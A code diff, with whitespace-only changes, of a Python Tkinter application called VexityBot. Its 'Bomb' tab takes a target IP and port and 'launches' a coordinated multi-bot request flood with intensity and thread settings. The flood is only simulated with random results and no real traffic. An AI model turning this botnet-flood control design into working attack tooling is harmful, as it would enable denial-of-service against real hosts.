         
-
+        
         ttk.Label(port_frame, text="Port:").pack(side=tk.LEFT, padx=(0, 5))
 
         self.bomb_port_var = tk.StringVar(value="8080")
@@ -1715,7 +1749,7 @@ class VexityBotGUI:
         port_combo.pack(side=tk.LEFT, padx=5)
 
         
-
+        
         # Quick IP buttons
 
         quick_frame = ttk.Frame(ip_input_frame)
@@ -1723,7 +1757,7 @@ class VexityBotGUI:
         quick_frame.pack(side=tk.LEFT, padx=10)
 
         
-
+        
         ttk.Label(quick_frame, text="Quick:").pack(side=tk.LEFT, padx=(0, 5))
 
         ttk.Button(quick_frame, text="1.1.1.1", command=lambda: self.set_quick_ip("1.1.1.1", "8080")).pack(side=tk.LEFT, padx=2)
@@ -1731,13 +1765,13 @@ class VexityBotGUI:
         ttk.Button(quick_frame, text="0.0.0.0", command=lambda: self.set_quick_ip("0.0.0.0", "21")).pack(side=tk.LEFT, padx=2)
 
         
-
+        
         # Bind IP entry changes
 
         self.bomb_ip_entry.bind('<KeyRelease>', self.on_ip_change)
 
         port_combo.bind('<<ComboboxSelected>>', self.on_port_change)
-
+    
     
 
     def create_bomb_control_section(self, parent_frame):
@@ -1749,7 +1783,7 @@ class VexityBotGUI:
         control_frame.pack(fill=tk.X, pady=(0, 10))
 
         
-
+        
         # Main control buttons
 
         main_buttons_frame = ttk.Frame(control_frame)
@@ -1757,7 +1791,7 @@ class VexityBotGUI:
         main_buttons_frame.pack(fill=tk.X, pady=5)
 
         
-
+        
         ttk.Button(main_buttons_frame, text="🚀 Launch", command=self.launch_bomb, style='Accent.TButton').pack(side=tk.LEFT, padx=5)
 
         ttk.Button(main_buttons_frame, text="⏹️ Stop", command=self.stop_bomb).pack(side=tk.LEFT, padx=5)
@@ -1767,7 +1801,7 @@ class VexityBotGUI:
         ttk.Button(main_buttons_frame, text="📊 Status", command=self.check_bomb_status).pack(side=tk.LEFT, padx=5)
 
         
-
+        
         # Advanced controls
 
         advanced_frame = ttk.Frame(control_frame)
@@ -1775,7 +1809,7 @@ class VexityBotGUI:
         advanced_frame.pack(fill=tk.X, pady=5)
 
         
-
+        
         ttk.Button(advanced_frame, text="🎯 Single Shot", command=self.single_shot).pack(side=tk.LEFT, padx=5)
 
         ttk.Button(advanced_frame, text="💥 Burst Mode", command=self.burst_mode).pack(side=tk.LEFT, padx=5)
@@ -1785,7 +1819,7 @@ class VexityBotGUI:
         ttk.Button(advanced_frame, text="🛡️ Test Mode", command=self.test_mode).pack(side=tk.LEFT, padx=5)
 
         
-
+        
         # Configuration options
 
         config_frame = ttk.Frame(control_frame)
@@ -1793,7 +1827,7 @@ class VexityBotGUI:
         config_frame.pack(fill=tk.X, pady=5)
 
         
-
+        
         self.bomb_intensity_var = tk.StringVar(value="Medium")
 
         ttk.Label(config_frame, text="Intensity:").pack(side=tk.LEFT, padx=(0, 5))
@@ -1803,7 +1837,7 @@ class VexityBotGUI:
         intensity_combo.pack(side=tk.LEFT, padx=5)
 
         
-
+        
         self.bomb_duration_var = tk.IntVar(value=10)
 
         ttk.Label(config_frame, text="Duration (sec):").pack(side=tk.LEFT, padx=(10, 5))
@@ -1813,7 +1847,7 @@ class VexityBotGUI:
         duration_spin.pack(side=tk.LEFT, padx=5)
 
         
-
+        
         self.bomb_threads_var = tk.IntVar(value=10)
 
         ttk.Label(config_frame, text="Threads:").pack(side=tk.LEFT, padx=(10, 5))
@@ -1821,7 +1855,7 @@ class VexityBotGUI:
         threads_spin = ttk.Spinbox(config_frame, from_=1, to=100, textvariable=self.bomb_threads_var, width=8)
 
         threads_spin.pack(side=tk.LEFT, padx=5)
-
+    
     
 
     def create_bomb_results_section(self, parent_frame):
@@ -1833,7 +1867,7 @@ class VexityBotGUI:
         results_frame.pack(fill=tk.BOTH, expand=True)
 
         
-
+        
         # Results display
 
         self.bomb_results = scrolledtext.ScrolledText(results_frame, height=15, font=('Consolas', 9))
@@ -1841,7 +1875,7 @@ class VexityBotGUI:
         self.bomb_results.pack(fill=tk.BOTH, expand=True, pady=5)
 
         
-
+        
         # Initialize with welcome message
 
         welcome_text = """
@@ -1903,7 +1937,7 @@ Ready to proceed with coordinated operations...
         """
 
         self.bomb_results.insert(tk.END, welcome_text)
-
+    
     
 
     def set_quick_ip(self, ip, port):
@@ -1917,7 +1951,7 @@ Ready to proceed with coordinated operations...
         self.bomb_port_var.set(port)
 
         self.update_bomb_status()
-
+    
     
 
     def on_ip_change(self, event):
@@ -1925,7 +1959,7 @@ Ready to proceed with coordinated operations...
         """Handle IP entry changes"""
 
         self.update_bomb_status()
-
+    
     
 
     def on_port_change(self, event):
@@ -1933,7 +1967,7 @@ Ready to proceed with coordinated operations...
         """Handle port selection changes"""
 
         self.update_bomb_status()
-
+    
     
 
     def update_bomb_status(self):
@@ -1945,7 +1979,7 @@ Ready to proceed with coordinated operations...
         port = self.bomb_port_var.get()
 
         
-
+        
         if ip in ["1.1.1.1", "0.0.0.0"]:
 
             self.bomb_status_label.config(text="🟢 Ready", foreground="green")
@@ -1957,7 +1991,7 @@ Ready to proceed with coordinated operations...
             self.bomb_status_label.config(text="🟡 Custom", foreground="orange")
 
             self.update_status(f"Custom target: {ip}:{port}")
-
+    
     
 
     def launch_bomb(self):
@@ -1969,13 +2003,13 @@ Ready to proceed with coordinated operations...
         port = self.bomb_port_var.get()
 
         
-
+        
         if not ip:
 
             messagebox.showwarning("Input Error", "Please enter a target IP address")
 
             return
-
+        
         
 
         # Confirm launch
@@ -1983,7 +2017,7 @@ Ready to proceed with coordinated operations...
         if not messagebox.askyesno("Confirm Launch", f"Launch operation against {ip}:{port} with all 23 bots?\n\nThis action cannot be undone."):
 
             return
-
+        
         
 
         self.bomb_status_label.config(text="🔴 Active", foreground="red")
@@ -1991,7 +2025,7 @@ Ready to proceed with coordinated operations...
         self.update_status(f"Launching coordinated operation against {ip}:{port} with all bots")
 
         
-
+        
         # Add launch message to results
 
         launch_msg = f"""
@@ -2027,11 +2061,11 @@ Status: LAUNCHING ALL BOTS
         self.bomb_results.see(tk.END)
 
         
-
+        
         # Simulate coordinated operation with all bots
 
         self.simulate_coordinated_bomb_operation(ip, port)
-
+    
     
 
     def simulate_coordinated_bomb_operation(self, ip, port):
@@ -2045,7 +2079,7 @@ Status: LAUNCHING ALL BOTS
         threads_per_bot = self.bomb_threads_var.get()
 
         
-
+        
         # Calculate operation parameters based on intensity
 
         if intensity == "Low":
@@ -2071,7 +2105,7 @@ Status: LAUNCHING ALL BOTS
             delay = 100
 
             max_requests_per_bot = duration * 100
-
+        
         
 
         # Show bot initialization
@@ -2079,11 +2113,11 @@ Status: LAUNCHING ALL BOTS
         self.show_bot_initialization()
 
         
-
+        
         # Simulate coordinated operation progress
 
         self.simulate_coordinated_operation_progress(ip, port, max_requests_per_bot, delay, threads_per_bot)
-
+    
     
 
     def show_bot_initialization(self):
@@ -2104,7 +2138,7 @@ Initializing all 24 bots for coordinated operation...
         self.bomb_results.insert(tk.END, init_msg)
 
         
-
+        
         # Show each bot initialization
 
         for i, bot in enumerate(self.bot_data):
@@ -2118,7 +2152,7 @@ Initializing all 24 bots for coordinated operation...
             self.root.update()
 
             time.sleep(0.1)  # Small delay for visual effect
-
+        
         
 
         ready_msg = """
@@ -2134,7 +2168,7 @@ Coordinated operation commencing...
         self.bomb_results.insert(tk.END, ready_msg)
 
         self.bomb_results.see(tk.END)
-
+    
     
 
     def simulate_coordinated_operation_progress(self, ip, port, max_requests_per_bot, delay, threads_per_bot):
@@ -2152,11 +2186,11 @@ Coordinated operation commencing...
             bot_stats = {}
 
             
-
+            
             start_time = time.time()
 
             
-
+            
             # Initialize bot statistics
 
             for i, bot in enumerate(self.bot_data):
@@ -2172,7 +2206,7 @@ Coordinated operation commencing...
                     'bot_name': bot['name']
 
                 }
-
+            
             
 
             # Simulate coordinated operation
@@ -2192,7 +2226,7 @@ Coordinated operation commencing...
                         total_requests_sent += 1
 
                         
-
+                        
                         # Simulate success/failure
 
                         if random.random() > 0.1:  # 90% success rate
@@ -2210,7 +2244,7 @@ Coordinated operation commencing...
                             total_failed_requests += 1
 
                             status = "FAILED"
-
+                        
                         
 
                         # Update results with bot info
@@ -2218,23 +2252,23 @@ Coordinated operation commencing...
                         result_msg = f"[{total_requests_sent:4d}] {bot['name']:12s} -> {ip}:{port} - {status} - {random.randint(10, 500)}ms\n"
 
                         
-
+                        
                         self.root.after(0, lambda msg=result_msg: self.bomb_results.insert(tk.END, msg))
 
                         self.root.after(0, lambda: self.bomb_results.see(tk.END))
 
                         
-
+                        
                         # Update status every 50 requests
 
                         if total_requests_sent % 50 == 0:
 
                             self.root.after(0, lambda: self.update_status(f"Coordinated Operation: {total_requests_sent} total requests sent by all bots"))
-
+                
                 
 
                 time.sleep(delay / 1000)  # Convert to seconds
-
+            
             
 
             # Final results with bot breakdown
@@ -2242,7 +2276,7 @@ Coordinated operation commencing...
             self.show_final_coordinated_results(ip, port, total_requests_sent, total_successful_requests, 
 
                                              total_failed_requests, bot_stats, start_time)
-
+        
         
 
         # Start coordinated operation in separate thread
@@ -2250,7 +2284,7 @@ Coordinated operation commencing...
         thread = threading.Thread(target=coordinated_operation_thread, daemon=True)
 
         thread.start()
-
+    
     
 
     def show_final_coordinated_results(self, ip, port, total_requests, successful, failed, bot_stats, start_time):
@@ -2288,11 +2322,11 @@ BOT PERFORMANCE BREAKDOWN:
 """
 
         
-
+        
         self.root.after(0, lambda: self.bomb_results.insert(tk.END, final_msg))
 
         
-
+        
         # Show individual bot statistics
 
         for bot_index, stats in bot_stats.items():
@@ -2302,7 +2336,7 @@ BOT PERFORMANCE BREAKDOWN:
             bot_msg = f"• {stats['bot_name']:12s}: {stats['requests_sent']:4d} req | {stats['successful']:4d} success | {bot_success_rate:5.1f}% rate\n"
 
             self.root.after(0, lambda msg=bot_msg: self.bomb_results.insert(tk.END, msg))
-
+        
         
 
         completion_msg = f"""
@@ -2324,7 +2358,7 @@ Bot Network Status: ALL BOTS ACTIVE
 """
 
         
-
+        
         self.root.after(0, lambda: self.bomb_results.insert(tk.END, completion_msg))
 
         self.root.after(0, lambda: self.bomb_results.see(tk.END))
@@ -2332,7 +2366,7 @@ Bot Network Status: ALL BOTS ACTIVE
         self.root.after(0, lambda: self.bomb_status_label.config(text="🟢 Ready", foreground="green"))
 
         self.root.after(0, lambda: self.update_status("Coordinated operation completed - all bots active"))
-
+    
     
 
     def simulate_bomb_operation(self, ip, port):
@@ -2346,7 +2380,7 @@ Bot Network Status: ALL BOTS ACTIVE
         threads = self.bomb_threads_var.get()
 
         
-
+        
         # Calculate operation parameters based on intensity
 
         if intensity == "Low":
@@ -2372,13 +2406,13 @@ Bot Network Status: ALL BOTS ACTIVE
             delay = 100
 
             max_requests = duration * 100
-
+        
         
 
         # Simulate operation progress
 
         self.simulate_operation_progress(ip, port, max_requests, delay)
-
+    
     
 
     def simulate_operation_progress(self, ip, port, max_requests, delay):
@@ -2390,7 +2424,7 @@ Bot Network Status: ALL BOTS ACTIVE
         import time
 
         
-
+        
         def operation_thread():
 
             requests_sent = 0
@@ -2400,11 +2434,11 @@ Bot Network Status: ALL BOTS ACTIVE
             failed_requests = 0
 
             
-
+            
             start_time = time.time()
 
             
-
+            
             while requests_sent < max_requests and time.time() - start_time < self.bomb_duration_var.get():
 
                 # Simulate request
@@ -2412,7 +2446,7 @@ Bot Network Status: ALL BOTS ACTIVE
                 requests_sent += 1
 
                 
-
+                
                 # Simulate success/failure
 
                 if random.random() > 0.1:  # 90% success rate
@@ -2426,7 +2460,7 @@ Bot Network Status: ALL BOTS ACTIVE
                     failed_requests += 1
 
                     status = "FAILED"
-
+                
                 
 
                 # Update results
@@ -2434,23 +2468,23 @@ Bot Network Status: ALL BOTS ACTIVE
                 result_msg = f"[{requests_sent:4d}] {ip}:{port} - {status} - {random.randint(10, 500)}ms\n"
 
                 
-
+                
                 self.root.after(0, lambda: self.bomb_results.insert(tk.END, result_msg))
 
                 self.root.after(0, lambda: self.bomb_results.see(tk.END))
 
                 
-
+                
                 # Update status
 
                 if requests_sent % 10 == 0:
 
                     self.root.after(0, lambda: self.update_status(f"Operation: {requests_sent}/{max_requests} requests sent"))
-
+                
                 
 
                 time.sleep(delay / 1000)  # Convert to seconds
-
+            
             
 
             # Final results
@@ -2488,7 +2522,7 @@ Status: COMPLETED
             self.root.after(0, lambda: self.bomb_status_label.config(text="🟢 Ready", foreground="green"))
 
             self.root.after(0, lambda: self.update_status("Operation completed"))
-
+        
         
 
         # Start operation in separate thread
@@ -2496,7 +2530,7 @@ Status: COMPLETED
         thread = threading.Thread(target=operation_thread, daemon=True)
 
         thread.start()
-
+    
     
 
     def stop_bomb(self):
@@ -2508,7 +2542,7 @@ Status: COMPLETED
         self.update_status("Stopping coordinated operation...")
 
         
-
+        
         stop_msg = f"""
 
 ⏹️ COORDINATED OPERATION STOPPED
@@ -2534,11 +2568,11 @@ Operation halted successfully.
         self.bomb_results.see(tk.END)
 
         
-
+        
         self.root.after(1000, lambda: self.bomb_status_label.config(text="🟢 Ready", foreground="green"))
 
         self.update_status("Coordinated operation stopped - all bots halted")
-
+    
     
 
     def reset_bomb(self):
@@ -2560,13 +2594,13 @@ Operation halted successfully.
             self.bomb_threads_var.set(10)
 
             
-
+            
             self.bomb_results.delete(1.0, tk.END)
 
             self.bomb_status_label.config(text="🟢 Ready", foreground="green")
 
             self.update_status("Bomb interface reset")
-
+    
     
 
     def check_bomb_status(self):
@@ -2584,7 +2618,7 @@ Operation halted successfully.
         threads = self.bomb_threads_var.get()
 
         
-
+        
         # Count bot statuses
 
         online_bots = len([bot for bot in self.bot_data if bot['status'] == 'Online'])
@@ -2594,7 +2628,7 @@ Operation halted successfully.
         maintenance_bots = len([bot for bot in self.bot_data if bot['status'] == 'Maintenance'])
 
         
-
+        
         status_text = f"""
 
 Bomb Status Report - Coordinated Bot Network
@@ -2654,11 +2688,11 @@ Ready to launch coordinated operation.
         """
 
         
-
+        
         messagebox.showinfo("Bomb Status", status_text)
 
         self.update_status("Bomb status and bot network checked")
-
+    
     
 
     def single_shot(self):
@@ -2672,7 +2706,7 @@ Ready to launch coordinated operation.
         self.bomb_intensity_var.set("Low")
 
         self.update_status("Single shot mode configured")
-
+    
     
 
     def burst_mode(self):
@@ -2686,7 +2720,7 @@ Ready to launch coordinated operation.
         self.bomb_intensity_var.set("High")
 
         self.update_status("Burst mode configured")
-
+    
     
 
     def continuous_mode(self):
@@ -2700,7 +2734,7 @@ Ready to launch coordinated operation.
         self.bomb_intensity_var.set("Maximum")
 
         self.update_status("Continuous mode configured")
-
+    
     
 
     def test_mode(self):
@@ -2714,7 +2748,7 @@ Ready to launch coordinated operation.
         self.bomb_intensity_var.set("Low")
 
         self.update_status("Test mode configured")
-
+    
     
 
     def create_settings_tab(self):
@@ -2726,7 +2760,7 @@ Ready to launch coordinated operation.
         self.notebook.add(settings_frame, text="Settings")
 
         
-
+        
         # General settings
 
         general_frame = ttk.LabelFrame(settings_frame, text="General Settings", padding=10)
@@ -2734,7 +2768,7 @@ Ready to launch coordinated operation.
         general_frame.pack(fill=tk.X, padx=5, pady=5)
 
         
-
+        
         ttk.Label(general_frame, text="Theme:").grid(row=0, column=0, sticky=tk.W, padx=5)
 
         self.theme_var = tk.StringVar(value="Light")
@@ -2744,7 +2778,7 @@ Ready to launch coordinated operation.
         theme_combo.grid(row=0, column=1, sticky=tk.W, padx=5)
 
         
-
+        
         ttk.Label(general_frame, text="Font Size:").grid(row=1, column=0, sticky=tk.W, padx=5)
 
         self.font_size_var = tk.IntVar(value=10)
@@ -2754,7 +2788,7 @@ Ready to launch coordinated operation.
         font_spin.grid(row=1, column=1, sticky=tk.W, padx=5)
 
         
-
+        
         # Code editor settings
 
         editor_frame = ttk.LabelFrame(settings_frame, text="Code Editor Settings", padding=10)
@@ -2762,29 +2796,29 @@ Ready to launch coordinated operation.
         editor_frame.pack(fill=tk.X, padx=5, pady=5)
 
         
-
+        
         self.auto_indent_var = tk.BooleanVar(value=True)
 
         ttk.Checkbutton(editor_frame, text="Auto Indent", variable=self.auto_indent_var).grid(row=0, column=0, sticky=tk.W, padx=5)
 
         
-
+        
         self.line_numbers_var = tk.BooleanVar(value=True)
 
         ttk.Checkbutton(editor_frame, text="Line Numbers", variable=self.line_numbers_var).grid(row=0, column=1, sticky=tk.W, padx=5)
 
         
-
+        
         self.word_wrap_var = tk.BooleanVar(value=True)
 
         ttk.Checkbutton(editor_frame, text="Word Wrap", variable=self.word_wrap_var).grid(row=1, column=0, sticky=tk.W, padx=5)
 
         
-
+        
         # Save settings button
 
         ttk.Button(settings_frame, text="Save Settings", command=self.save_settings).pack(pady=10)
-
+    
     
 
     def create_status_bar(self):
@@ -2796,23 +2830,23 @@ Ready to launch coordinated operation.
         self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
 
         
-
+        
         self.status_label = ttk.Label(self.status_bar, text="Ready", style='Status.TLabel')
 
         self.status_label.pack(side=tk.LEFT, padx=5)
 
         
-
+        
         self.time_label = ttk.Label(self.status_bar, text="", style='Status.TLabel')
 
         self.time_label.pack(side=tk.RIGHT, padx=5)
 
         
-
+        
         # Update time
 
         self.update_time()
-
+    
     
 
     def bind_events(self):
@@ -2840,11 +2874,11 @@ Ready to launch coordinated operation.
         self.root.bind('<Control-0>', lambda e: self.reset_zoom())
 
         
-
+        
         # Window close event
 
         self.root.protocol("WM_DELETE_WINDOW", self.exit_application)
-
+    
     
 
     def center_window(self):
@@ -2862,7 +2896,7 @@ Ready to launch coordinated operation.
         y = (self.root.winfo_screenheight() // 2) - (height // 2)
 
         self.root.geometry(f'{width}x{height}+{x}+{y}')
-
+    
     
 
     def update_time(self):
@@ -2874,7 +2908,7 @@ Ready to launch coordinated operation.
         self.time_label.config(text=current_time)
 
         self.root.after(1000, self.update_time)
-
+    
     
 
     # Menu command methods
@@ -2888,7 +2922,7 @@ Ready to launch coordinated operation.
             if messagebox.askyesno("Unsaved Changes", "You have unsaved changes. Do you want to save them?"):
 
                 self.save_file()
-
+        
         
 
         self.text_editor.delete(1.0, tk.END)
@@ -2898,7 +2932,7 @@ Ready to launch coordinated operation.
         self.unsaved_changes = False
 
         self.update_status("New file created")
-
+    
     
 
     def open_file(self):
@@ -2914,7 +2948,7 @@ Ready to launch coordinated operation.
         )
 
         
-
+        
         if file_path:
 
             try:
@@ -2936,7 +2970,7 @@ Ready to launch coordinated operation.
             except Exception as e:
 
                 messagebox.showerror("Error", f"Could not open file: {str(e)}")
-
+    
     
 
     def save_file(self):
@@ -2962,7 +2996,7 @@ Ready to launch coordinated operation.
         else:
 
             self.save_as_file()
-
+    
     
 
     def save_as_file(self):
@@ -2980,7 +3014,7 @@ Ready to launch coordinated operation.
         )
 
         
-
+        
         if file_path:
 
             try:
@@ -2998,7 +3032,7 @@ Ready to launch coordinated operation.
             except Exception as e:
 
                 messagebox.showerror("Error", f"Could not save file: {str(e)}")
-
+    
     
 
     def cut_text(self):
@@ -3012,7 +3046,7 @@ Ready to launch coordinated operation.
         except:
 
             pass
-
+    
     
 
     def copy_text(self):
@@ -3026,7 +3060,7 @@ Ready to launch coordinated operation.
         except:
 
             pass
-
+    
     
 
     def paste_text(self):
@@ -3040,7 +3074,7 @@ Ready to launch coordinated operation.
         except:
 
             pass
-
+    
     
 
     def find_text(self):
@@ -3048,7 +3082,7 @@ Ready to launch coordinated operation.
         """Open find dialog"""
 
         messagebox.showinfo("Find", "Find functionality will be implemented")
-
+    
     
 
     def replace_text(self):
@@ -3056,7 +3090,7 @@ Ready to launch coordinated operation.
         """Open replace dialog"""
 
         messagebox.showinfo("Replace", "Replace functionality will be implemented")
-
+    
     
 
     def toggle_toolbar(self):
@@ -3070,7 +3104,7 @@ Ready to launch coordinated operation.
         else:
 
             self.toolbar.pack(side=tk.TOP, fill=tk.X, padx=5, pady=2)
-
+    
     
 
     def toggle_status_bar(self):
@@ -3084,7 +3118,7 @@ Ready to launch coordinated operation.
         else:
 
             self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
-
+    
     
 
     def zoom_in(self):
@@ -3098,7 +3132,7 @@ Ready to launch coordinated operation.
         if font_size < 24:
 
             self.text_editor.config(font=('Consolas', font_size + 1))
-
+    
     
 
     def zoom_out(self):
@@ -3112,7 +3146,7 @@ Ready to launch coordinated operation.
         if font_size > 8:
 
             self.text_editor.config(font=('Consolas', font_size - 1))
-
+    
     
 
     def reset_zoom(self):
@@ -3120,7 +3154,7 @@ Ready to launch coordinated operation.
         """Reset zoom to default"""
 
         self.text_editor.config(font=('Consolas', 10))
-
+    
     
 
     def open_database_manager(self):
@@ -3130,7 +3164,7 @@ Ready to launch coordinated operation.
         self.notebook.select(2)  # Switch to database tab
 
         self.update_status("Database Manager opened")
-
+    
     
 
     def open_code_generator(self):
@@ -3138,7 +3172,7 @@ Ready to launch coordinated operation.
         """Open code generator"""
 
         messagebox.showinfo("Code Generator", "Code Generator will be implemented")
-
+    
     
 
     def open_data_analyzer(self):
@@ -3148,7 +3182,7 @@ Ready to launch coordinated operation.
         self.notebook.select(3)  # Switch to data analysis tab
 
         self.update_status("Data Analyzer opened")
-
+    
     
 
     def open_bots_manager(self):
@@ -3158,7 +3192,7 @@ Ready to launch coordinated operation.
         self.notebook.select(4)  # Switch to bots tab
 
         self.update_status("Bots Manager opened")
-
+    
     
 
     def open_ai_management(self):
@@ -3168,7 +3202,7 @@ Ready to launch coordinated operation.
         self.notebook.select(5)  # Switch to AI management tab
 
         self.update_status("AI Management opened")
-
+    
     
 
     def open_bomb_interface(self):
@@ -3178,7 +3212,7 @@ Ready to launch coordinated operation.
         self.notebook.select(6)  # Switch to bomb tab
 
         self.update_status("Bomb Interface opened")
-
+    
     
 
     def open_settings(self):
@@ -3188,7 +3222,7 @@ Ready to launch coordinated operation.
         self.notebook.select(7)  # Switch to settings tab
 
         self.update_status("Settings opened")
-
+    
     
 
     def show_documentation(self):
@@ -3196,7 +3230,7 @@ Ready to launch coordinated operation.
         """Show documentation"""
 
         messagebox.showinfo("Documentation", "Documentation will be available soon")
-
+    
     
 
     def show_about(self):
@@ -3210,13 +3244,13 @@ Ready to launch coordinated operation.
         Version 1.0.0
 
         
-
+        
         A comprehensive full-stack development environment
 
         built with Python and Tkinter.
 
         
-
+        
         Features:
 
         • Code Editor
@@ -3230,13 +3264,13 @@ Ready to launch coordinated operation.
         • Modern GUI Interface
 
         
-
+        
         Built with ❤️ using Python
 
         """
 
         messagebox.showinfo("About VexityBot", about_text)
-
+    
     
 
     # Database methods
@@ -3246,7 +3280,7 @@ Ready to launch coordinated operation.
         """Connect to database"""
 
         messagebox.showinfo("Database", "Database connection will be implemented")
-
+    
     
 
     def disconnect_database(self):
@@ -3254,7 +3288,7 @@ Ready to launch coordinated operation.
         """Disconnect from database"""
 
         messagebox.showinfo("Database", "Database disconnected")
-
+    
     
 
     def execute_query(self):
@@ -3270,7 +3304,7 @@ Ready to launch coordinated operation.
         else:
 
             messagebox.showwarning("Query", "Please enter a SQL query")
-
+    
     
 
     def clear_query(self):
@@ -3278,7 +3312,7 @@ Ready to launch coordinated operation.
         """Clear query text"""
 
         self.query_text.delete(1.0, tk.END)
-
+    
     
 
     # Data analysis methods
@@ -3288,7 +3322,7 @@ Ready to launch coordinated operation.
         """Load CSV file"""
 
         messagebox.showinfo("Data Analysis", "CSV loading will be implemented")
-
+    
     
 
     def load_from_db(self):
@@ -3296,7 +3330,7 @@ Ready to launch coordinated operation.
         """Load data from database"""
 
         messagebox.showinfo("Data Analysis", "Database loading will be implemented")
-
+    
     
 
     def generate_sample_data(self):
@@ -3310,7 +3344,7 @@ Ready to launch coordinated operation.
         =====================
 
         
-
+        
         Dataset: Random Numbers
 
         Size: 1000 rows
@@ -3318,7 +3352,7 @@ Ready to launch coordinated operation.
         Columns: x, y, z, category
 
         
-
+        
         Statistics:
 
         - Mean x: 0.5
@@ -3330,7 +3364,7 @@ Ready to launch coordinated operation.
         - Categories: A(25%), B(30%), C(45%)
 
         
-
+        
         Ready for analysis!
 
         """
@@ -3340,7 +3374,7 @@ Ready to launch coordinated operation.
         self.results_text.insert(1.0, sample_data)
 
         self.update_status("Sample data generated")
-
+    
     
 
     def descriptive_stats(self):
@@ -3354,7 +3388,7 @@ Ready to launch coordinated operation.
         ======================
 
         
-
+        
         Count: 1000
 
         Mean: 0.5
@@ -3372,7 +3406,7 @@ Ready to launch coordinated operation.
         Max: 0.99
 
         
-
+        
         Distribution: Normal
 
         Skewness: 0.1
@@ -3386,7 +3420,7 @@ Ready to launch coordinated operation.
         self.results_text.insert(1.0, stats_text)
 
         self.update_status("Descriptive statistics generated")
-
+    
     
 
     def create_visualization(self):
@@ -3394,7 +3428,7 @@ Ready to launch coordinated operation.
         """Create data visualization"""
 
         messagebox.showinfo("Visualization", "Data visualization will be implemented")
-
+    
     
 
     def ml_analysis(self):
@@ -3408,7 +3442,7 @@ Ready to launch coordinated operation.
         =========================
 
         
-
+        
         Model: Linear Regression
 
         R² Score: 0.85
@@ -3418,7 +3452,7 @@ Ready to launch coordinated operation.
         MAE: 0.09
 
         
-
+        
         Feature Importance:
 
         - Feature 1: 0.45
@@ -3428,7 +3462,7 @@ Ready to launch coordinated operation.
         - Feature 3: 0.23
 
         
-
+        
         Cross-validation Score: 0.82 ± 0.05
 
         """
@@ -3438,7 +3472,7 @@ Ready to launch coordinated operation.
         self.results_text.insert(1.0, ml_text)
 
         self.update_status("Machine learning analysis completed")
-
+    
     
 
     # Bot control methods
@@ -3450,7 +3484,7 @@ Ready to launch coordinated operation.
         self.update_status("Refreshing all bot statuses...")
 
         
-
+        
         # Check VPS connection first
 
         if not self.check_vps_connection():
@@ -3460,7 +3494,7 @@ Ready to launch coordinated operation.
             self.update_status("VPS connection failed")
 
             return
-
+        
         
 
         # Simulate checking each bot status
@@ -3468,7 +3502,7 @@ Ready to launch coordinated operation.
         self.root.after(500, lambda: self.update_status("Checking bot statuses..."))
 
         self.root.after(1500, lambda: self.update_status("All bots refreshed successfully"))
-
+    
     
 
     def check_vps_connection(self):
@@ -3494,7 +3528,7 @@ Ready to launch coordinated operation.
         except:
 
             return False
-
+    
     
 
     def start_all_bots(self):
@@ -3504,13 +3538,13 @@ Ready to launch coordinated operation.
         offline_bots = [bot for bot in self.bot_data if bot["status"] == "Offline"]
 
         
-
+        
         if not offline_bots:
 
             self.update_status("No offline bots to start")
 
             return
-
+        
         
 
         # Check VPS connection first
@@ -3522,7 +3556,7 @@ Ready to launch coordinated operation.
             self.update_status("VPS connection failed - cannot start bots")
 
             return
-
+        
         
 
         # Start bots with progress indication
@@ -3530,7 +3564,7 @@ Ready to launch coordinated operation.
         self.update_status(f"Starting {len(offline_bots)} bots...")
 
         
-
+        
         def start_bot_sequence():
 
             successful_starts = 0
@@ -3538,7 +3572,7 @@ Ready to launch coordinated operation.
             failed_starts = 0
 
             
-
+            
             for i, bot in enumerate(offline_bots):
 
                 try:
@@ -3548,7 +3582,7 @@ Ready to launch coordinated operation.
                     self.update_status(f"Starting {bot['name']} on port {bot['port']}...")
 
                     
-
+                    
                     # Simulate potential startup issues
 
                     if bot['name'] in ['PsiBot', 'ChiBot']:  # Simulate some bots having issues
@@ -3560,13 +3594,13 @@ Ready to launch coordinated operation.
                             self.update_status(f"Failed to start {bot['name']} - Port {bot['port']} in use")
 
                             continue
-
+                    
                     
 
                     bot["status"] = "Online"
 
                     successful_starts += 1
-
+                    
                     
 
                 except Exception as e:
@@ -3574,7 +3608,7 @@ Ready to launch coordinated operation.
                     failed_starts += 1
 
                     self.update_status(f"Error starting {bot['name']}: {str(e)}")
-
+            
             
 
             # Final status update
@@ -3590,13 +3624,13 @@ Ready to launch coordinated operation.
                 self.update_status(f"Successfully started all {successful_starts} bots")
 
                 messagebox.showinfo("Bot Startup", f"All {successful_starts} bots started successfully!")
-
+        
         
 
         # Simulate startup delay
 
         self.root.after(1000, start_bot_sequence)
-
+    
     
 
     def stop_all_bots(self):
@@ -3606,13 +3640,13 @@ Ready to launch coordinated operation.
         online_bots = [bot for bot in self.bot_data if bot["status"] == "Online"]
 
         
-
+        
         if not online_bots:
 
             self.update_status("No online bots to stop")
 
             return
-
+        
         
 
         # Confirm before stopping all bots
@@ -3622,13 +3656,13 @@ Ready to launch coordinated operation.
             self.update_status("Stop all operation cancelled")
 
             return
-
+        
         
 
         self.update_status(f"Stopping {len(online_bots)} bots...")
 
         
-
+        
         def stop_bot_sequence():
 
             successful_stops = 0
@@ -3636,7 +3670,7 @@ Ready to launch coordinated operation.
             failed_stops = 0
 
             
-
+            
             for bot in online_bots:
 
                 try:
@@ -3646,7 +3680,7 @@ Ready to launch coordinated operation.
                     self.update_status(f"Stopping {bot['name']} on port {bot['port']}...")
 
                     
-
+                    
                     # Simulate potential shutdown issues
 
                     if bot['name'] in ['AlphaBot', 'BetaBot']:  # Simulate some bots having issues
@@ -3658,13 +3692,13 @@ Ready to launch coordinated operation.
                             self.update_status(f"Failed to stop {bot['name']} - High traffic, use force stop")
 
                             continue
-
+                    
                     
 
                     bot["status"] = "Offline"
 
                     successful_stops += 1
-
+                    
                     
 
                 except Exception as e:
@@ -3672,7 +3706,7 @@ Ready to launch coordinated operation.
                     failed_stops += 1
 
                     self.update_status(f"Error stopping {bot['name']}: {str(e)}")
-
+            
             
 
             # Final status update
@@ -3688,13 +3722,13 @@ Ready to launch coordinated operation.
                 self.update_status(f"Successfully stopped all {successful_stops} bots")
 
                 messagebox.showinfo("Bot Shutdown", f"All {successful_stops} bots stopped successfully!")
-
+        
         
 
         # Simulate shutdown delay
 
         self.root.after(1000, stop_bot_sequence)
-
+    
     
 
     def show_bot_statistics(self):
@@ -3712,7 +3746,7 @@ Ready to launch coordinated operation.
